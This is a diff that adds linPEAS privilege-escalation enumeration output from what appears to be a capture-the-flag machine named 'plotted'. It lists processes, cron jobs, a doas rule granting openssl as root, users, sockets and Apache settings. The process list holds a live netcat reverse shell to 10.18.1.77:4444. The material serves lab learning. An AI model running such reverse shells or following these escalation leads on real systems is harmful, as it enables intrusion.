@@ -590,3 +590,595 @@ mysql        796  0.2 35.9 1301108 359896 ?      Ssl  15:48   0:17 /usr/sbin/mys
 root        1772  0.0  0.3  21256  3860 ?        Ss   16:16   0:01 /lib/systemd/systemd-udevd
 root       12284  0.1  0.9 194056  9420 ?        Ss   16:18   0:04 /usr/sbin/apache2 -k start
 www-data   39056  0.0  0.8 194616  8936 ?        S    16:46   0:00  _ /usr/sbin/apache2 -k start
+www-data   39085  0.0  0.9 194624  9948 ?        S    16:46   0:00  _ /usr/sbin/apache2 -k start
+www-data   39096  0.0  0.9 194616  9844 ?        S    16:46   0:00  _ /usr/sbin/apache2 -k start
+www-data   39099  0.0  1.0 194672 10124 ?        S    16:46   0:01  _ /usr/sbin/apache2 -k start
+www-data   43460  0.0  0.0   2608   560 ?        S    17:17   0:00  |   _ sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.18.1.77 4444 >/tmp/f
+www-data   43463  0.0  0.0   2652   564 ?        S    17:17   0:00  |       _ cat /tmp/f
+www-data   43464  0.0  0.3   4236  3184 ?        S    17:17   0:00  |       _ /bin/bash -i
+www-data   43465  0.0  0.1   3332  1864 ?        S    17:17   0:00  |       _ nc 10.18.1.77 4444
+www-data   39100  0.0  1.0 194616 10080 ?        S    16:46   0:00  _ /usr/sbin/apache2 -k start
+www-data   39107  0.0  1.0 194672 10220 ?        S    16:46   0:00  _ /usr/sbin/apache2 -k start
+www-data   39117  0.0  1.0 194680 10096 ?        S    16:46   0:00  _ /usr/sbin/apache2 -k start
+www-data   39140  0.0  1.0 194620 10124 ?        S    16:46   0:00  _ /usr/sbin/apache2 -k start
+www-data   39152  0.0  1.0 194880 10584 ?        S    16:46   0:00  _ /usr/sbin/apache2 -k start
+www-data   39160  0.0  0.9 194640  9804 ?        S    16:47   0:00  _ /usr/sbin/apache2 -k start
+root       12382  0.0  0.6 455868  6804 ?        Ssl  16:18   0:00 /usr/libexec/fwupd/fwupd
+root       12545  0.0  0.2 314924  2476 ?        Ssl  16:18   0:00 /usr/lib/upower/upowerd
+systemd+   25018  0.0  0.4  26612  4816 ?        Ss   16:20   0:00 /lib/systemd/systemd-networkd
+  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
+systemd+   25035  0.0  0.7  23900  7444 ?        Ss   16:20   0:00 /lib/systemd/systemd-resolved
+root       25038  0.0  0.8  35008  8476 ?        S<s  16:20   0:01 /lib/systemd/systemd-journald
+systemd+   25138  0.0  0.3  90232  3940 ?        Ssl  16:20   0:00 /lib/systemd/systemd-timesyncd
+  └─(Caps) 0x0000000002000000=cap_sys_time
+root       26486  0.0  0.2 239292  2328 ?        Ssl  16:25   0:00 /usr/lib/accountsservice/accounts-daemon
+
+╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                               
+                                                                                                           
+╔══════════╣ Files opened by processes belonging to other users
+╚ This is usually empty because of the lack of privileges to read other user processes information         
+COMMAND     PID   TID TASKCMD               USER   FD      TYPE             DEVICE SIZE/OFF    NODE NAME   
+
+╔══════════╣ Processes with credentials in memory (root req)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory         
+gdm-password Not Found                                                                                     
+gnome-keyring-daemon Not Found                                                                             
+lightdm Not Found                                                                                          
+vsftpd Not Found                                                                                           
+apache2 process found (dump creds from memory as root)                                                     
+sshd: process found (dump creds from memory as root)
+
+╔══════════╣ Cron jobs
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                     
+/bin/crontab                                                                                               
+incrontab Not Found
+-rw-r--r-- 1 root root    1091 Oct 28  2021 /etc/crontab                                                   
+
+/etc/cron.d:
+total 24
+drwxr-xr-x   2 root root 4096 Oct 28  2021 .
+drwxr-xr-x 101 root root 4096 Sep 24 17:18 ..
+-rw-r--r--   1 root root  201 Feb 14  2020 e2scrub_all
+-rw-r--r--   1 root root  712 Mar 27  2020 php
+-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
+-rw-r--r--   1 root root  189 Aug 24  2021 popularity-contest
+
+/etc/cron.daily:
+total 52
+drwxr-xr-x   2 root root 4096 Sep 24 16:44 .
+drwxr-xr-x 101 root root 4096 Sep 24 17:18 ..
+-rwxr-xr-x   1 root root  539 Sep 30  2020 apache2
+-rwxr-xr-x   1 root root  376 Dec  4  2019 apport
+-rwxr-xr-x   1 root root 1478 Apr  9  2020 apt-compat
+-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
+-rwxr-xr-x   1 root root 1187 Sep  5  2019 dpkg
+-rwxr-xr-x   1 root root  377 Jan 21  2019 logrotate
+-rwxr-xr-x   1 root root 1123 Feb 25  2020 man-db
+-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
+-rwxr-xr-x   1 root root 4574 Jul 18  2019 popularity-contest
+-rwxr-xr-x   1 root root  214 May 14  2021 update-notifier-common
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x   2 root root 4096 Aug 24  2021 .
+drwxr-xr-x 101 root root 4096 Sep 24 17:18 ..
+-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x   2 root root 4096 Aug 24  2021 .
+drwxr-xr-x 101 root root 4096 Sep 24 17:18 ..
+-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
+
+/etc/cron.weekly:
+total 20
+drwxr-xr-x   2 root root 4096 Aug 24  2021 .
+drwxr-xr-x 101 root root 4096 Sep 24 17:18 ..
+-rwxr-xr-x   1 root root  813 Feb 25  2020 man-db
+-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
+-rwxr-xr-x   1 root root  403 Aug  5  2021 update-notifier-common
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+* *     * * *   plot_admin /var/www/scripts/backup.sh
+
+╔══════════╣ Systemd PATH
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths             
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin                                
+
+╔══════════╣ Analyzing .service files
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                
+/etc/systemd/system/multi-user.target.wants/atd.service is executing some relative path                    
+/etc/systemd/system/multi-user.target.wants/grub-common.service is executing some relative path
+/etc/systemd/system/sleep.target.wants/grub-common.service is executing some relative path
+You can't write on systemd PATH
+
+╔══════════╣ System timers
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                  
+NEXT                        LEFT          LAST                        PASSED       UNIT                         ACTIVATES                     
+Sat 2022-09-24 17:39:00 UTC 5min left     Sat 2022-09-24 17:09:00 UTC 24min ago    phpsessionclean.timer        phpsessionclean.service       
+Sat 2022-09-24 23:22:06 UTC 5h 48min left Sat 2022-09-24 16:07:01 UTC 1h 26min ago apt-daily.timer              apt-daily.service             
+Sun 2022-09-25 00:00:00 UTC 6h left       Sat 2022-09-24 15:48:31 UTC 1h 45min ago logrotate.timer              logrotate.service             
+Sun 2022-09-25 00:00:00 UTC 6h left       Sat 2022-09-24 15:48:31 UTC 1h 45min ago man-db.timer                 man-db.service                
+Sun 2022-09-25 00:58:22 UTC 7h left       Sat 2022-09-24 16:18:06 UTC 1h 15min ago fwupd-refresh.timer          fwupd-refresh.service         
+Sun 2022-09-25 03:10:21 UTC 9h left       Sat 2022-09-24 15:48:31 UTC 1h 45min ago e2scrub_all.timer            e2scrub_all.service           
+Sun 2022-09-25 03:22:31 UTC 9h left       Sat 2022-09-24 16:16:26 UTC 1h 17min ago ua-messaging.timer           ua-messaging.service          
+Sun 2022-09-25 05:25:03 UTC 11h left      Sat 2022-09-24 16:09:36 UTC 1h 24min ago motd-news.timer              motd-news.service             
+Sun 2022-09-25 06:06:03 UTC 12h left      Sat 2022-09-24 16:16:01 UTC 1h 17min ago apt-daily-upgrade.timer      apt-daily-upgrade.service     
+Sun 2022-09-25 16:02:20 UTC 22h left      Sat 2022-09-24 16:02:20 UTC 1h 31min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service                                                                        
+Mon 2022-09-26 00:00:00 UTC 1 day 6h left Sat 2022-09-24 15:48:31 UTC 1h 45min ago fstrim.timer                 fstrim.service                
+n/a                         n/a           n/a                         n/a          snapd.snap-repair.timer      snapd.snap-repair.service     
+
+╔══════════╣ Analyzing .timer files
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                  
+                                                                                                           
+╔══════════╣ Analyzing .socket files
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                 
+/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request
+/snap/core18/2246/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                                                                                   
+/snap/core18/2246/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                                                              
+/snap/core18/2246/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                                             
+/snap/core18/2246/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                                      
+/snap/core18/2246/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                                      
+/snap/core18/2246/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog                                                                                                     
+/snap/core18/2246/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                                                                  
+/snap/core18/2246/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                                                           
+/snap/core18/2246/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                                                           
+/snap/core18/2284/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                                                                                   
+/snap/core18/2284/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                                                              
+/snap/core18/2284/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                                             
+/snap/core18/2284/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                                      
+/snap/core18/2284/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                                      
+/snap/core18/2284/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog                                                                                                     
+/snap/core18/2284/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                                                                  
+/snap/core18/2284/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                                                           
+/snap/core18/2284/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                                                           
+/snap/core20/1169/usr/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                                                                               
+/snap/core20/1169/usr/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                                                          
+/snap/core20/1169/usr/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
+/snap/core20/1169/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                                  
+/snap/core20/1169/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                                  
+
+╔══════════╣ Unix Sockets Listening
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                 
+/org/kernel/linux/storage/multipathd                                                                       
+/run/dbus/system_bus_socket
+  └─(Read Write)
+/run/lvm/lvmpolld.socket
+/run/mysqld/mysqld.sock
+  └─(Read Write)
+/run/mysqld/mysqlx.sock
+  └─(Read Write)
+/run/snapd-snap.socket
+  └─(Read Write)
+/run/snapd.socket
+  └─(Read Write)
+/run/systemd/fsck.progress
+/run/systemd/journal/dev-log
+  └─(Read Write)
+/run/systemd/journal/io.systemd.journal
+/run/systemd/journal/socket
+  └─(Read Write)
+/run/systemd/journal/stdout
+  └─(Read Write)
+/run/systemd/journal/syslog
+  └─(Read Write)
+/run/systemd/notify
+  └─(Read Write)
+/run/systemd/private
+  └─(Read Write)
+/run/systemd/userdb/io.systemd.DynamicUser
+  └─(Read Write)
+/run/udev/control
+/run/uuidd/request
+  └─(Read Write)
+/var/lib/amazon/ssm/ipc/health
+/var/lib/amazon/ssm/ipc/termination
+/var/run/mysqld/mysqld.sock
+  └─(Read Write)
+/var/run/mysqld/mysqlx.sock
+  └─(Read Write)
+/var/snap/lxd/common/lxd/unix.socket
+
+╔══════════╣ D-Bus config files
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                   
+Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)
+
+╔══════════╣ D-Bus Service Objects list
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                   
+NAME                            PID PROCESS         USER             CONNECTION    UNIT                        SESSION DESCRIPTION
+:1.10                           769 unattended-upgr root             :1.10         unattended-upgrades.service -       -
+:1.11                           627 snapd           root             :1.11         snapd.service               -       -
+:1.24                         12382 fwupd           root             :1.24         fwupd.service               -       -
+:1.25                         12545 upowerd         root             :1.25         upower.service              -       -
+:1.35                             1 systemd         root             :1.35         init.scope                  -       -
+:1.36                         25018 systemd-network systemd-network  :1.36         systemd-networkd.service    -       -
+:1.38                         25035 systemd-resolve systemd-resolve  :1.38         systemd-resolved.service    -       -
+:1.39                         25138 systemd-timesyn systemd-timesync :1.39         systemd-timesyncd.service   -       -
+:1.44                         26486 accounts-daemon[0m root             :1.44         accounts-daemon.service     -       -
+:1.5                            634 udisksd         root             :1.5          udisks2.service             -       -
+:1.6                            722 polkitd         root             :1.6          polkit.service              -       -
+:1.7                            630 systemd-logind  root             :1.7          systemd-logind.service      -       -
+:1.89                         50352 busctl          plot_admin       :1.89         cron.service                -       -
+:1.9                            621 networkd-dispat root             :1.9          networkd-dispatcher.service -       -
+com.ubuntu.LanguageSelector       - -               -                (activatable) -                           -       -
+com.ubuntu.SoftwareProperties     - -               -                (activatable) -                           -       -
+io.netplan.Netplan                - -               -                (activatable) -                           -       -
+org.freedesktop.Accounts      26486 accounts-daemon[0m root             :1.44         accounts-daemon.service     -       -
+org.freedesktop.DBus              1 systemd         root             -             init.scope                  -       -
+org.freedesktop.PackageKit        - -               -                (activatable) -                           -       -
+org.freedesktop.PolicyKit1      722 polkitd         root             :1.6          polkit.service              -       -
+org.freedesktop.UDisks2         634 udisksd         root             :1.5          udisks2.service             -       -
+org.freedesktop.UPower        12545 upowerd         root             :1.25         upower.service              -       -
+org.freedesktop.bolt              - -               -                (activatable) -                           -       -
+org.freedesktop.fwupd         12382 fwupd           root             :1.24         fwupd.service               -       -
+org.freedesktop.hostname1         - -               -                (activatable) -                           -       -
+org.freedesktop.locale1           - -               -                (activatable) -                           -       -
+org.freedesktop.login1          630 systemd-logind  root             :1.7          systemd-logind.service      -       -
+org.freedesktop.network1      25018 systemd-network systemd-network  :1.36         systemd-networkd.service    -       -
+org.freedesktop.resolve1      25035 systemd-resolve systemd-resolve  :1.38         systemd-resolved.service    -       -
+org.freedesktop.systemd1          1 systemd         root             :1.35         init.scope                  -       -
+org.freedesktop.thermald          - -               -                (activatable) -                           -       -
+org.freedesktop.timedate1         - -               -                (activatable) -                           -       -
+org.freedesktop.timesync1     25138 systemd-timesyn systemd-timesync :1.39         systemd-timesyncd.service   -       -
+
+                                        ╔═════════════════════╗
+════════════════════════════════════════╣ Network Information ╠════════════════════════════════════════    
+                                        ╚═════════════════════╝                                            
+╔══════════╣ Hostname, hosts and DNS
+plotted                                                                                                    
+127.0.0.1 localhost
+127.0.1.1 plotted
+
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+nameserver 127.0.0.53
+options edns0 trust-ad
+search eu-west-1.compute.internal
+
+╔══════════╣ Interfaces
+```
+```text
+# symbolic names for networks, see networks(5) for more information                                        
+link-local 169.254.0.0
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
+    link/ether 02:2d:24:7d:23:43 brd ff:ff:ff:ff:ff:ff
+    inet 10.10.113.202/16 brd 10.10.255.255 scope global dynamic eth0
+       valid_lft 2802sec preferred_lft 2802sec
+    inet6 fe80::2d:24ff:fe7d:2343/64 scope link 
+       valid_lft forever preferred_lft forever
+
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                              
+tcp   LISTEN 0      4096        127.0.0.53%lo:53           0.0.0.0:*                                       
+tcp   LISTEN 0      128               0.0.0.0:22           0.0.0.0:*            
+tcp   LISTEN 0      70              127.0.0.1:33060        0.0.0.0:*            
+tcp   LISTEN 0      151             127.0.0.1:3306         0.0.0.0:*            
+tcp   LISTEN 0      128                  [::]:22              [::]:*            
+tcp   LISTEN 0      511                     *:445                *:*            
+tcp   LISTEN 0      511                     *:80                 *:*            
+
+╔══════════╣ Can I sniff with tcpdump?
+No                                                                                                         
+                                                                                                           
+
+                                         ╔═══════════════════╗
+═════════════════════════════════════════╣ Users Information ╠═════════════════════════════════════════    
+                                         ╚═══════════════════╝                                             
+╔══════════╣ My user
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users                                   
+uid=1001(plot_admin) gid=1001(plot_admin) groups=1001(plot_admin)                                          
+
+╔══════════╣ Do I have PGP keys?
+/bin/gpg                                                                                                   
+netpgpkeys Not Found
+netpgp Not Found                                                                                           
+                                                                                                           
+╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                           
+                                                                                                           
+╔══════════╣ Checking sudo tokens
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                     
+ptrace protection is enabled (1)                                                                           
+gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it
+
+╔══════════╣ Checking doas.conf
+permit nopass plot_admin as root cmd openssl                                                               
+
+╔══════════╣ Checking Pkexec policy
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2 
+                                                                                                           
+[Configuration]
+AdminIdentities=unix-user:0
+[Configuration]
+AdminIdentities=unix-group:sudo
+[Configuration]
+AdminIdentities=unix-group:sudo;unix-group:admin
+
+╔══════════╣ Superusers
+root:x:0:0:root:/root:/bin/bash                                                                            
+
+╔══════════╣ Users with console
+plot_admin:x:1001:1001:,,,:/home/plot_admin:/bin/bash                                                      
+root:x:0:0:root:/root:/bin/bash
+ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
+
+╔══════════╣ All users & groups
+uid=0(root) gid=0(root) groups=0(root)                                                                     
+uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
+uid=1001(plot_admin) gid=1001(plot_admin) groups=1001(plot_admin)
+uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
+uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
+uid=102(systemd-timesync) gid=104(systemd-timesync) groups=104(systemd-timesync)
+uid=103(messagebus) gid=106(messagebus) groups=106(messagebus)
+uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm),5(tty)
+uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
+uid=106(tss) gid=111(tss) groups=111(tss)
+uid=107(uuidd) gid=112(uuidd) groups=112(uuidd)
+uid=108(tcpdump) gid=113(tcpdump) groups=113(tcpdump)
+uid=109(landscape) gid=115(landscape) groups=115(landscape)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=110(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
+uid=111(usbmux) gid=46(plugdev) groups=46(plugdev)
+uid=112(sshd) gid=65534(nogroup) groups=65534(nogroup)
+uid=113(mysql) gid=118(mysql) groups=118(mysql)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=5(games) gid=60(games) groups=60(games)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=6(man) gid=12(man) groups=12(man)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=998(lxd) gid=100(users) groups=100(users)
+uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)
+uid=9(news) gid=9(news) groups=9(news)
+
+╔══════════╣ Login now
+ 17:34:00 up  1:46,  0 users,  load average: 0.64, 0.28, 1.07                                              
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+╔══════════╣ Last logons
+reboot   system boot  Thu Jan 27 10:48:26 2022 - Thu Jan 27 10:49:44 2022  (00:01)     0.0.0.0             
+plot_admin pts/2        Thu Oct 28 10:14:37 2021 - Thu Oct 28 10:15:01 2021  (00:00)     0.0.0.0
+plot_admin pts/2        Thu Oct 28 10:04:15 2021 - Thu Oct 28 10:10:28 2021  (00:06)     0.0.0.0
+ubuntu   pts/1        Thu Oct 28 09:51:45 2021 - Thu Oct 28 10:43:45 2021  (00:52)     10.20.1.103
+ubuntu   pts/0        Thu Oct 28 07:03:48 2021 - Thu Oct 28 10:44:09 2021  (03:40)     10.20.1.36
+ubuntu   tty1         Thu Oct 28 07:00:54 2021 - Thu Oct 28 10:44:15 2021  (03:43)     0.0.0.0
+reboot   system boot  Thu Oct 28 06:55:38 2021 - Thu Jan 27 10:49:44 2022 (91+03:54)   0.0.0.0
+reboot   system boot  Mon Oct 25 02:08:03 2021 - Thu Jan 27 10:49:44 2022 (94+08:41)   0.0.0.0
+
+wtmp begins Mon Oct 25 02:08:03 2021
+
+╔══════════╣ Last time logon each user
+Username         Port     From             Latest                                                          
+ubuntu           pts/0    10.20.1.36       Fri Jan 28 02:03:27 +0000 2022
+
+╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)                                                                            
+                                                                                                           
+╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
+                                                                                                           
+
+                                       ╔══════════════════════╗
+═══════════════════════════════════════╣ Software Information ╠═══════════════════════════════════════     
+                                       ╚══════════════════════╝                                            
+╔══════════╣ Useful software
+/bin/base64                                                                                                
+/bin/curl
+/bin/doas
+/bin/nc
+/bin/netcat
+/bin/perl
+/bin/php
+/bin/ping
+/bin/python3
+/bin/sudo
+/bin/wget
+
+╔══════════╣ Installed Compilers
+                                                                                                           
+╔══════════╣ MySQL
+mysql  Ver 8.0.27-0ubuntu0.20.04.1 for Linux on x86_64 ((Ubuntu))                                          
+
+═╣ MySQL connection using default root/root ........... No
+═╣ MySQL connection using root/toor ................... No                                                 
+═╣ MySQL connection using root/NOPASS ................. No                                                 
+                                                                                                           
+╔══════════╣ Searching mysql credentials and exec
+From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = mysql                            
+Found readable /etc/mysql/my.cnf
+!includedir /etc/mysql/conf.d/
+!includedir /etc/mysql/mysql.conf.d/
+
+╔══════════╣ Analyzing MariaDB Files (limit 70)
+                                                                                                           
+-rw------- 1 root root 317 Oct 28  2021 /etc/mysql/debian.cnf
+
+╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
+Apache version: Server version: Apache/2.4.41 (Ubuntu)                                                     
+Server built:   2022-01-05T14:49:56
+httpd Not Found
+                                                                                                           
+Nginx version: nginx Not Found
+                                                                                                           
+sh: 2593: grep -R -B1 "httpd-php" /etc/apache2 2>/dev/null: not found
+══╣ PHP exec extensions
+drwxr-xr-x 2 root root 4096 Oct 28  2021 /etc/apache2/sites-enabled                                        
+drwxr-xr-x 2 root root 4096 Oct 28  2021 /etc/apache2/sites-enabled
+lrwxrwxrwx 1 root root 35 Oct 28  2021 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf                                                                                             
+<VirtualHost *:80>
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html/80
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+<VirtualHost *:445>
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html/445
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+
+-rw-r--r-- 1 root root 2787 Oct 28  2021 /etc/apache2/sites-available/000-default.conf
+<VirtualHost *:80>
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html/80
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+<VirtualHost *:445>
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html/445
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+lrwxrwxrwx 1 root root 35 Oct 28  2021 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf                                                                                             
+<VirtualHost *:80>
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html/80
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+<VirtualHost *:445>
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html/445
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+
+-rw-r--r-- 1 root root 72941 Oct 25  2021 /etc/php/7.4/apache2/php.ini
+allow_url_fopen = On
+allow_url_include = Off
+odbc.allow_persistent = On
+mysqli.allow_persistent = On
+pgsql.allow_persistent = On
+-rw-r--r-- 1 root root 72539 Oct 25  2021 /etc/php/7.4/cli/php.ini
+allow_url_fopen = On
+allow_url_include = Off
+odbc.allow_persistent = On
+mysqli.allow_persistent = On
+pgsql.allow_persistent = On
+
+╔══════════╣ Analyzing Rsync Files (limit 70)
+-rw-r--r-- 1 root root 1044 Sep 17  2021 /usr/share/doc/rsync/examples/rsyncd.conf                         
+[ftp]
+        comment = public archive
+        path = /var/www/pub
+        use chroot = yes
+        lock file = /var/lock/rsyncd
+        read only = yes
+        list = yes
+        uid = nobody
+        gid = nogroup
+        strict modes = yes
+        ignore errors = no
+        ignore nonreadable = yes
+        transfer logging = no
+        timeout = 600
+        refuse options = checksum dry-run
+        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz
+
+╔══════════╣ Analyzing Ldap Files (limit 70)
+The password hash is from the {SSHA} to 'structural'                                                       
+drwxr-xr-x 2 root root 4096 Aug 24  2021 /etc/ldap
+
+drwxr-xr-x 2 root root 32 Oct 15  2021 /snap/core18/2246/etc/ldap
+
+drwxr-xr-x 2 root root 32 Dec 15  2021 /snap/core18/2284/etc/ldap
+
+╔══════════╣ Searching ssl/ssh files
+╔══════════╣ Analyzing SSH Files (limit 70)                                                                
+                                                                                                           
+-rw-r--r-- 1 www-data www-data 81 Oct 28  2021 /var/www/html/80/admin/id_rsa
+VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE
+
+ChallengeResponseAuthentication no
+UsePAM yes
+PasswordAuthentication yes
+══╣ Some certificates were found (out limited):
+/etc/pki/fwupd/LVFS-CA.pem                                                                                 
+/etc/pki/fwupd-metadata/LVFS-CA.pem
+/etc/pollinate/entropy.ubuntu.com.pem
+/snap/core18/2246/etc/ssl/certs/ACCVRAIZ1.pem
+/snap/core18/2246/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
+/snap/core18/2246/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
+/snap/core18/2246/etc/ssl/certs/AffirmTrust_Commercial.pem
+/snap/core18/2246/etc/ssl/certs/AffirmTrust_Networking.pem
